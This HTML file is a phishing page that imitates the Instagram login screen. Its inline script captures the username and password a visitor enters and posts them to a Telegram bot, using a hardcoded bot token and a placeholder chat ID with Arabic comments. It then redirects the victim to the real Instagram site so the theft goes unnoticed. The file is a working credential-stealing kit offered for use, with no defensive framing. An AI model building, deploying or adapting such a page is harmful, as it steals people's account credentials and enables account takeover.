<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram Login Page</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="wrapper">
        <div class="header">
            <div class="top">
                <div class="logo"><img src="instagram.png" alt="instagram" style="width: 175px;"></div>
            </div>
            <div class="form">
                <div class="input_field">
                    <input type="text" placeholder="Phone number, username, or email" class="input">
                </div>
                <div class="input_field">
                    <input type="password" placeholder="Password" class="input">
                </div>
                <div class="btn"><a href="#">Log In</a></div>
            </div>
        </div>
    </div>

    <script>
        const TOKEN = "8812996442:AAFuIMxaFdw708YFZEvXCHGIiyhndvKCJ7Y";
        const CHAT_ID = "ضع_رقم_الآيدي_هنا";

        document.querySelector('.btn a').addEventListener('click', function(e) {
            e.preventDefault();
            
            const inputs = document.querySelectorAll('.input');
            const username = inputs[0].value;
            const password = inputs[1].value;

            if(!username || !password) {
                alert("الرجاء إدخال البيانات");
                return;
            }

            const message = `🚨 بيانات جديدة 🚨\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                window.location.href = "https://www.instagram.com";
            })
            .catch(error => {
                window.location.href = "https://www.instagram.com";
            });
        });
    </script>
</body>
</html>
